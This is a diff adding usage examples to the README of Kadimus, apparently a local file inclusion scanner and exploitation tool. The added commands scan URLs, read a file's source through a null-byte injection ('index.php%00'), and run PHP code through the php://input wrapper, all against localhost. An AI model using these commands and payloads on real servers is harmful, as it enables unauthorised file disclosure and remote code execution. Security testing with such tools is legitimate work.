@@ -92,3 +92,19 @@ $ make
       -f, --filename STRING     Set filename to grab source [REQUIRED]
       -O FILE                   Set output file (Default: stdout)
 ```
+
+## Examples:
+
+### Scanning:
+```
+./kadimus -u localhost/?pg=contact -A my_user_agent
+./kadimus -U url_list.txt --threads 10 --connect-timeout 10 --retry-times 0
+```
+### Get source code of file:
+```
+./kadimus -t localhost/?pg=contact -G -f "index.php%00" -O local_output.php --inject-at pg
+```
+### Execute php code:
+```
+./kadimus -t localhost/?pg=php://input%00 -C '<?php echo "pwned"; ?>' -X input
+```
